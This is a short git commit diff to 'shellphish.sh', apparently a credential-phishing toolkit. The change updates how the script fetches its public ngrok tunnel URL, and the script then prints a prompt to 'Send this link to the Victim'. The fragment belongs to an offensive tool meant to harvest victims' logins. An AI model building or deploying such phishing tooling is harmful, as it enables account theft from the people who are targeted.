1ea45d76967d1ddc5cbeb7346397c440a2ff9a19
The Linux Choice <34893261+thelinuxchoice@users.noreply.github.com>
2019-04-27 12:13:09 -0300

    Update shellphish.sh

--- shellphish.sh
+++ shellphish.sh
@@ -391,7 +391,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
